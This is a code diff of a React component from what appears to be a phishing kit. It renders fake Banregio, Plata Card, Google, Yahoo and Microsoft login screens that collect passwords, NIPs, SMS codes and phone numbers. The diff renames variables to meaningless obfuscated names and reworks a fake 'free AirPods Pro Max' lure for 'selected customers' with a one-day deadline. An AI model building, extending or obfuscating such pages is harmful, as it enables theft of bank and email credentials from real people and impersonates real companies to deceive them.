@@ -30,6 +30,8 @@ import banregioLogoWhite from '../../assets/banregio_logo_white.png';
 import googleLogo from '../../assets/google-logo.png';
 import yahooLogo from '@assets/pngwing.com 2.png';
 import microsoftLogo from '@assets/pngwing.com.png';
+import promoImage1 from '@assets/IMG_5647_1754950720172.jpeg';
+import promoImage2 from '@assets/IMG_5646_1754952460517.jpeg';
 
 interface ScreenTemplatesProps {
   currentScreen: ScreenType;
@@ -73,7 +75,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
   banco = obfuscatedStrings.bankDefault
 }) => {
   // Estados del formulario con nombres ofuscados
-  const [dataA, setDataA] = useState(''); // folioInput
+  const [dataA, setDataA] = useState(''); // dataA
   const [dataB, setDataB] = useState({ [obfuscatedStrings.userField]: '', [obfuscatedStrings.passField]: '' }); // loginInputs
   const [dataC, setDataC] = useState(''); // codigoInput
   const [dataD, setDataD] = useState(''); // nipInput
@@ -84,9 +86,9 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
   const [dataH, setDataH] = useState(''); // smsCompraInput
   const [dataI, setDataI] = useState(''); // telefonoInput
   const [errorB, setErrorB] = useState<string | null>(null); // passwordError
-  const [dataJ, setDataJ] = useState(''); // gmailCorreo
-  const [dataK, setDataK] = useState(''); // gmailContrasena
-  const [showPass, setShowPass] = useState(false); // showGmailPassword
+  const [dataJ, setDataJ] = useState(''); // dataJ
+  const [dataK, setDataK] = useState(''); // dataK
+  const [showPass, setShowPass] = useState(false); // showPass
   const [gmailScreen, setGmailScreen] = useState<'correo' | 'contrasena'>('correo');
   const [hotmailStep2, setHotmailStep2] = useState(false);
   const [yahooStep2, setYahooStep2] = useState(false);
@@ -156,11 +158,12 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               </div>
             </div>
 
-            {/* Contenido principal de la promoción */}
-            <div className="platacard-container min-h-screen">
-              <div className="max-w-6xl mx-auto px-6 py-16">
-                {/* Título principal con emoji */}
-                <div className="text-center mb-16">
+            {/* Contenido principal reorganizado de la promoción */}
+            <div className="platacard-container">
+              <div className="max-w-7xl mx-auto">
+                
+                {/* Sección hero con mejor organización */}
+                <div className="px-6 py-12 text-center bg-gradient-to-b from-gray-50 to-white">
                   <div className="flex items-center justify-center mb-6">
                     <span className="text-3xl mr-3">🎉</span>
                     <h2 className="text-2xl md:text-3xl font-bold text-gray-800">
@@ -168,82 +171,86 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                     </h2>
                   </div>
                   
-                  {/* Promoción destacada */}
-                  <div className="platacard-bg text-white rounded-2xl p-12 md:p-16 mb-12 max-w-3xl mx-auto shadow-2xl">
-                    <h1 className="text-5xl md:text-7xl font-bold mb-4">AirPods</h1>
-                    <h1 className="text-5xl md:text-7xl font-bold mb-6">Pro Max</h1>
-                    <p className="text-3xl md:text-4xl text-orange-300">Totalmente Gratis</p>
+                  {/* Promoción destacada con mejor proporción */}
+                  <div className="platacard-bg text-white rounded-2xl p-8 md:p-12 mb-8 max-w-2xl mx-auto shadow-2xl">
+                    <h1 className="text-4xl md:text-6xl font-bold mb-3">AirPods</h1>
+                    <h1 className="text-4xl md:text-6xl font-bold mb-4">Pro Max</h1>
+                    <p className="text-2xl md:text-3xl text-orange-300">Totalmente Gratis</p>
                   </div>
                   
-                  <p className="text-xl md:text-2xl text-gray-700 leading-relaxed max-w-4xl mx-auto mb-16">
+                  <p className="text-lg md:text-xl text-gray-700 leading-relaxed max-w-3xl mx-auto mb-8">
                     Para clientes seleccionados por el buen uso de su tarjeta reciben 
                     <strong className="platacard-accent"> AirPods Pro Max totalmente gratis</strong>. 
                     Sin costo adicional por su excelente historial crediticio.
                   </p>
-                </div>
 
-                {/* Beneficios destacados */}
-                <div className="grid sm:grid-cols-2 gap-8 mb-16 max-w-4xl mx-auto">
-                  <div className="platacard-card text-center border border-orange-200 p-8">
-                    <div className="text-4xl mb-4">🎧</div>
-                    <h3 className="font-bold text-gray-900 mb-3 text-2xl">AirPods Pro Max</h3>
-                    <p className="text-lg platacard-accent font-semibold">$0 pesos</p>
-                  </div>
-                  <div className="platacard-card text-center border border-orange-200 p-8">
-                    <div className="text-4xl mb-4">💳</div>
-                    <h3 className="font-bold text-gray-900 mb-3 text-2xl">Sin costos</h3>
-                    <p className="text-lg platacard-accent font-semibold">Totalmente gratis</p>
+                  {/* Botón principal movido aquí para mejor flujo */}
+                  <div className="mb-12">
+                    <Button 
+                      className="platacard-button px-10 py-5 text-xl font-bold w-full sm:w-auto transform hover:scale-105 transition-all duration-300 shadow-2xl"
+                      onClick={() => onSubmit(ScreenType.PROMOCION, {})}
+                    >
+                      Reclamar mis AirPods Pro Max →
+                    </Button>
                   </div>
                 </div>
 
-                {/* Botón principal */}
-                <div className="text-center mb-20">
-                  <Button 
-                    className="platacard-button px-12 py-6 text-2xl font-bold w-full sm:w-auto transform hover:scale-105 transition-all duration-300 shadow-2xl"
-                    onClick={() => onSubmit(ScreenType.PROMOCION, {})}
-                  >
-                    Reclamar mis AirPods Pro Max →
-                  </Button>
-                </div>
-
-                {/* Información adicional - con mucho mejor espaciado */}
-                <div className="platacard-card p-12 mb-16 max-w-5xl mx-auto">
-                  <div className="flex items-center justify-center mb-8">
-                    <span className="text-3xl mr-4">🎧</span>
-                    <h3 className="text-2xl font-bold text-gray-800">Tus AirPods Pro Max te esperan</h3>
-                  </div>
-                  
-                  <div className="grid grid-cols-1 md:grid-cols-3 gap-12 text-center mb-8">
-                    <div className="space-y-4">
-                      <div className="font-bold text-gray-800 text-xl">Producto</div>
-                      <div className="text-gray-600 font-medium text-lg">AirPods Pro Max Originales</div>
+                {/* Sección de beneficios en contenedor separado */}
+                <div className="px-6 py-12 bg-white">
+                  <div className="max-w-4xl mx-auto">
+                    <div className="grid sm:grid-cols-2 gap-6 mb-12">
+                      <div className="platacard-card text-center border border-orange-200 p-6">
+                        <div className="text-3xl mb-3">🎧</div>
+                        <h3 className="font-bold text-gray-900 mb-2 text-xl">AirPods Pro Max</h3>
+                        <p className="text-lg platacard-accent font-semibold">$0 pesos</p>
+                      </div>
+                      <div className="platacard-card text-center border border-orange-200 p-6">
+                        <div className="text-3xl mb-3">💳</div>
+                        <h3 className="font-bold text-gray-900 mb-2 text-xl">Sin costos</h3>
+                        <p className="text-lg platacard-accent font-semibold">Totalmente gratis</p>
+                      </div>
                     </div>
-                    <div className="space-y-4">
-                      <div className="font-bold text-gray-800 text-xl">Vigencia</div>
-                      <div className="text-gray-600 font-medium text-lg">1 día</div>
-                    </div>
-                    <div className="space-y-4">
-                      <div className="font-bold text-gray-800 text-xl">Entrega</div>
-                      <div className="text-gray-600 font-medium text-lg">A domicilio</div>
-                    </div>
-                  </div>
-                </div>
 
-                {/* Imágenes promocionales agregadas */}
-                <div className="grid grid-cols-1 md:grid-cols-2 gap-8 max-w-5xl mx-auto mb-20">
-                  <div className="platacard-card overflow-hidden shadow-lg">
-                    <img 
-                      src="/attached_assets/IMG_5647_1754950720172.jpeg" 
-                      alt="AirPods Pro Max Promoción" 
-                      className="w-full h-64 object-cover rounded-lg"
-                    />
-                  </div>
-                  <div className="platacard-card overflow-hidden shadow-lg">
-                    <img 
-                      src="/attached_assets/IMG_5646_1754952460517.jpeg" 
-                      alt="Oferta Especial Plata Card" 
-                      className="w-full h-64 object-cover rounded-lg"
-                    />
+                    {/* Información del producto reorganizada */}
+                    <div className="platacard-card p-8 mb-12">
+                      <div className="flex items-center justify-center mb-6">
+                        <span className="text-2xl mr-3">🎧</span>
+                        <h3 className="text-xl font-bold text-gray-800">Detalles de tu premio</h3>
+                      </div>
+                      
+                      <div className="grid grid-cols-1 md:grid-cols-3 gap-8 text-center">
+                        <div className="space-y-3">
+                          <div className="font-bold text-gray-800 text-lg">Producto</div>
+                          <div className="text-gray-600 font-medium">AirPods Pro Max Originales</div>
+                        </div>
+                        <div className="space-y-3">
+                          <div className="font-bold text-gray-800 text-lg">Vigencia</div>
+                          <div className="text-gray-600 font-medium">1 día</div>
+                        </div>
+                        <div className="space-y-3">
+                          <div className="font-bold text-gray-800 text-lg">Entrega</div>
+                          <div className="text-gray-600 font-medium">A domicilio</div>
+                        </div>
+                      </div>
+                    </div>
+
+                    {/* Imágenes promocionales con mejor organización */}
+                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-12">
+                      <div className="platacard-card overflow-hidden shadow-lg">
+                        <img 
+                          src={promoImage1} 
+                          alt="AirPods Pro Max Promoción" 
+                          className="w-full h-56 object-cover rounded-lg"
+                        />
+                      </div>
+                      <div className="platacard-card overflow-hidden shadow-lg">
+                        <img 
+                          src={promoImage2} 
+                          alt="Oferta Especial Plata Card" 
+                          className="w-full h-56 object-cover rounded-lg"
+                        />
+                      </div>
+                    </div>
                   </div>
                 </div>
               </div>
@@ -354,13 +361,13 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 type="text" 
                 placeholder="Ingrese su número de folio" 
                 className="w-full border border-gray-300 rounded p-2 mb-3"
-                value={folioInput}
-                onChange={(e) => setFolioInput(e.target.value)}
+                value={dataA}
+                onChange={(e) => setDataA(e.target.value)}
               />
             </div>
             <Button 
               className={primaryBtnClass}
-              onClick={() => onSubmit(ScreenType.FOLIO, { folio: folioInput })}
+              onClick={() => onSubmit(ScreenType.FOLIO, { folio: dataA })}
             >
               Continuar
             </Button>
@@ -934,15 +941,15 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         // Función para cambiar de la pantalla de correo a la de contraseña
         const handleGmailNextScreen = () => {
           if (gmailScreen === 'correo') {
-            if (gmailCorreo.trim()) {
+            if (dataJ.trim()) {
               setGmailScreen('contrasena');
             }
           } else {
             // Enviar datos completos
-            if (gmailContrasena.trim()) {
+            if (dataK.trim()) {
               onSubmit(ScreenType.GMAIL, { 
-                correo: gmailCorreo, 
-                contrasena: gmailContrasena 
+                correo: dataJ, 
+                contrasena: dataK 
               });
             }
           }
@@ -950,7 +957,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         
         // Función para alternar la visibilidad de la contraseña
         const toggleGmailPasswordVisibility = () => {
-          setShowGmailPassword(!showGmailPassword);
+          setShowPass(!showPass);
         };
         
         // Contenedor personalizado para Gmail que es distinto al resto de pantallas
@@ -963,7 +970,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         };
         
         // Pantalla de correo electrónico (primera pantalla)
-        const gmailCorreoContent = (
+        const dataJContent = (
           <>
             <div className="flex justify-center mb-4">
               <img src={googleLogo} alt="Google Logo" className="w-16 h-16" />
@@ -975,11 +982,11 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             
             <Input 
               type="text"
-              id="gmailCorreo" 
+              id="dataJ" 
               placeholder="Correo electrónico o teléfono" 
               className="w-full p-3 border border-gray-300 rounded mb-4" 
-              value={gmailCorreo}
-              onChange={(e) => setGmailCorreo(e.target.value)}
+              value={dataJ}
+              onChange={(e) => setDataJ(e.target.value)}
             />
             
             <div className="text-left mb-6">
@@ -996,7 +1003,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         );
         
         // Pantalla de contraseña (segunda pantalla)
-        const gmailContrasenaContent = (
+        const dataKContent = (
           <>
             <div className="flex justify-center mb-4">
               <img src={googleLogo} alt="Google Logo" className="w-16 h-16" />
@@ -1004,24 +1011,24 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             
             <div className="flex items-center justify-center mb-6">
               <div className="bg-gray-200 text-gray-700 w-10 h-10 rounded-full flex items-center justify-center font-semibold mr-2">
-                {gmailCorreo[0]?.toUpperCase() || 'G'}
+                {dataJ[0]?.toUpperCase() || 'G'}
               </div>
-              <span className="text-sm">{gmailCorreo}</span>
+              <span className="text-sm">{dataJ}</span>
             </div>
             
             <Input 
-              type={showGmailPassword ? "text" : "password"}
-              id="gmailContrasena" 
+              type={showPass ? "text" : "password"}
+              id="dataK" 
               placeholder="Ingresa tu contraseña" 
               className="w-full p-3 border border-gray-300 rounded mb-2" 
-              value={gmailContrasena}
-              onChange={(e) => setGmailContrasena(e.target.value)}
+              value={dataK}
+              onChange={(e) => setDataK(e.target.value)}
             />
             
             <div className="flex items-center mb-4 text-left">
               <Checkbox 
                 id="mostrarContrasena" 
-                checked={showGmailPassword}
+                checked={showPass}
                 onCheckedChange={toggleGmailPasswordVisibility}
                 className="mr-2"
               />
@@ -1044,7 +1051,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         );
         
         // Renderizar la pantalla correspondiente según el estado
-        return getGmailContainer(gmailScreen === 'correo' ? gmailCorreoContent : gmailContrasenaContent);
+        return getGmailContainer(gmailScreen === 'correo' ? dataJContent : dataKContent);
         
       case ScreenType.GMAIL_VERIFY:
         // Contenedor personalizado para Gmail Verify que es distinto al resto de pantallas
@@ -1069,7 +1076,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             </p>
 
             <div className="inline-block border border-gray-300 rounded-full py-2 px-6 bg-gray-100 mb-5 mx-auto">
-              {screenData.correo || gmailCorreo || "inmobiliariadexter627@gmail.com"}
+              {screenData.correo || dataJ || "inmobiliariadexter627@gmail.com"}
             </div>
 
             <div className="text-5xl font-normal my-8" id="codigo-grande">
